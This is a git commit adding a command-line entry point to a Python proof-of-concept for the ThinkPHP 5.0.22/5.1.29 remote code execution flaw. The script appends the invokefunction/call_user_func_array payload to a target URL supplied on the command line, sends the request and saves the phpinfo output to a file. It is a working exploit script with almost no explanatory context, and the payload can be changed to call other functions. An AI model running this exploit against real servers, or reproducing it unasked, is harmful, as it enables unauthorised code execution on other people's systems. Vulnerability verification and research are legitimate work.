c75be2b94d4f141f8e49dc5e4cfc8992f86c512f
ipt <fashengzxf@outlook.com>
2022-08-19 14:03:02 +0800

    Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability

--- src/request/thinkphp5.0.20.py
+++ src/request/thinkphp5.0.20.py
@@ -1,4 +1,5 @@
 #coding:utf-8
+import sys
 import requests,re
 #index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
 def verify(target_url):
@@ -6,3 +7,10 @@ def verify(target_url):
         'User_Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
     }
     resp = requests.get(target_url,headers=headers)
+    with open("phpinfo.html",'wb') as f:
+        f.write(resp.content)
+if __name__ == '__main__':
+    args = sys.argv
+    url = args[1]
+    taget_url = url+r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
+    verify(taget_url)
